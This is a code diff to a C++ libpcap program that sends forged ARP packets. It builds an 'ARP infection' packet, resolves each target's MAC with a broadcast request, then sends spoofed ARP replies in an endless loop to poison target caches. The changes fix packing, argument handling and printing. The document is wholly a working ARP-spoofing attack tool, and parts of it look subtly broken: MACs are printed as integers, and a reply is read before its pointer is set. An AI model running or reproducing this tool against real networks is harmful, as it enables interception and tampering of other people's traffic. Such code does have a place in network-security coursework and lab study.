@@ -14,7 +14,7 @@ void usage() {
 typedef struct ARP_INFECTION_PACKET {
 	ETHERNET_HDR eth_h;
 	ARP_HDR arp_h;
-} ARP_PACKET;
+} __attribute__((packed)) ARP_PACKET;
 
 void receive_arp(int c, char* sender_ip){
 	ARP_PACKET *packet = new ARP_PACKET;
@@ -32,27 +32,35 @@ ARP_PACKET send_arp_preparing(
 
 	printf("Source MAC: %u, Destination MAC: %u\n", packet.eth_h.ether_shost, packet.eth_h.ether_dhost);
 
-	packet.eth_h.ether_type = htons(0x0806); // ARP protocol
+	packet.eth_h.ether_type = htons(0x0806); 	// ARP protocol
 
-	packet.arp_h.hardware_type = htons(1); // Ethernet
+	packet.arp_h.hardware_type = htons(0x0001); // Ethernet
 	packet.arp_h.protocol_type = htons(0x0800); // IPv4
-	packet.arp_h.hardware_length = 6; // MAC address length
-	packet.arp_h.protocol_length = 4; // IPv4 address length
-	packet.arp_h.operation = htons(oper); // ARP reply
+	packet.arp_h.hardware_length = 0x06; 		// MAC address length
+	packet.arp_h.protocol_length = 0x04; 		// IPv4 address length
+	packet.arp_h.operation = htons(oper); 		// ARP reply
 
-	stringip_to_byteip(sender_ip, packet.arp_h.sender_ip_address); // Sender IP address
-	stringip_to_byteip(target_ip, packet.arp_h.target_ip_address); // Target IP
-	stringmac_to_bytemac(sender_mac, packet.arp_h.sender_mac_address); // Sender MAC address
-	stringmac_to_bytemac(target_mac, packet.arp_h.target_mac_address); // Target MAC address
+	stringip_to_byteip(sender_ip, &packet.arp_h.sender_ip_address); 	// Sender IP address
+	stringip_to_byteip(target_ip, &packet.arp_h.target_ip_address); 	// Target IP
+	stringmac_to_bytemac(sender_mac, packet.arp_h.sender_mac_address); 	// Sender MAC address
+	stringmac_to_bytemac(target_mac, packet.arp_h.target_mac_address); 	// Target MAC address
 
-	printf("Sender IP: %u, Target IP: %u\n", packet.arp_h.sender_ip_address, packet.arp_h.target_ip_address);
+	printf("Sender IP: %hhu.%hhu.%hhu.%hhu, Target IP: %hhu.%hhu.%hhu.%hhu\n",
+		packet.arp_h.sender_ip_address & 0xFF,
+		(packet.arp_h.sender_ip_address >> 8) & 0xFF,
+		(packet.arp_h.sender_ip_address >> 16) & 0xFF,
+		(packet.arp_h.sender_ip_address >> 24) & 0xFF,
+		packet.arp_h.target_ip_address & 0xFF,
+		(packet.arp_h.target_ip_address >> 8) & 0xFF,
+		(packet.arp_h.target_ip_address >> 16) & 0xFF,
+		(packet.arp_h.target_ip_address >> 24) & 0xFF);
 	printf("Sender MAC: %u, Target MAC: %u\n", packet.arp_h.sender_mac_address, packet.arp_h.target_mac_address);
 
 	return packet;
 }
 
 int main(int argc, char* argv[]) {
-	if (argc != 2) {
+	if (argc != 4) {
 		usage();
 		return -1;
 	}
@@ -66,18 +74,17 @@ int main(int argc, char* argv[]) {
 	}
 
 	while (1){
-		for(int i = 4; i < argc; i += 2) {
+		for(int i = 2; i < argc; i += 2) {
 			/* who is <target_ip>? request */
 			ARP_PACKET tip_req_packet = send_arp_preparing(
 				"90:de:80:d5:a0:66", "ff:ff:ff:ff:ff:ff",
-				1,
+				0x0001,
 				argv[i],argv[i+1],
 				"90:de:80:d5:a0:66", "00:00:00:00:00:00"); // ARP request operation
 			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&tip_req_packet), sizeof(tip_req_packet)) != 0) {
 				fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
 				return -1;
 			}
-			printf("Sent ARP request from %s to %s\n", argv[i], argv[i + 1]);
 
 			/* who is <target_ip>? wait and receive */
 			ARP_PACKET* tip_res_packet = nullptr;
@@ -94,12 +101,12 @@ int main(int argc, char* argv[]) {
 				/* is arp? */
 
 				char target_ip[16];
-				byteip_to_stringip(tip_res_packet->arp_h.target_ip_address, target_ip);
+				byteip_to_stringip(&tip_res_packet->arp_h.target_ip_address, target_ip);
 
 				tip_res_packet = reinterpret_cast<ARP_PACKET*>(const_cast<u_char*>(packet));
-				if (ntohs(tip_res_packet->eth_h.ether_type) == 0x0806 && // ARP protocol
-					ntohs(tip_res_packet->arp_h.operation) == 2 && // ARP reply operation
-					strncmp(target_ip, argv[i + 1], 16) == 0) { // Check if target IP matches
+				if (ntohs(tip_res_packet->eth_h.ether_type) == 0x0806 &&
+					ntohs(tip_res_packet->arp_h.operation) == 2 &&
+					strncmp(target_ip, argv[i + 1], 16) == 0) {
 					printf("Received ARP reply from %s\n", argv[i + 1]);
 					break;
 				}
@@ -113,7 +120,7 @@ int main(int argc, char* argv[]) {
 
 			ARP_PACKET packet = send_arp_preparing(
 				dst_mac, src_mac,
-				2,
+				0x0002,
 				argv[i], argv[i+1],
 				sender_mac, target_mac);
 			/* send arp reply */
